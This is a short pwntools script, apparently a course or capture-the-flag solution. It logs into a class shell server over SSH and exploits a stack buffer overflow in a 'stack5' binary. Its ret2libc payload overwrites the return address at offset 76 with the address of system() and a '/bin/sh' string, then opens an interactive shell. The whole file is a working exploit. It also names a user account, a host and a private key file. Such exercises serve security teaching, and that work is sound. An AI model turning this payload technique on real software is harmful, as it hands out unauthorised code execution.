#!/usr/bin/python
from pwn import *

context.clear(log_level='debug')
s = ssh('jjcabral', 'cs4401shell.walls.ninja', keyfile='jjcabral_ssh_key')
s.set_working_directory('/problems/stack5r_0_276992cd64a480ac2fc6a2ba8f345b23/')
p = s.process(['./stack5'])

#ret offest
retoffset = 76

# lib c system address
system_addr = p32(0xf7e29f10)
padaddr = b'\x90' * 4
shelladdr = p32(0xf7f689db)
payload = flat({retoffset: system_addr}, padaddr, shelladdr)

p.sendline(payload) 
p.interactive()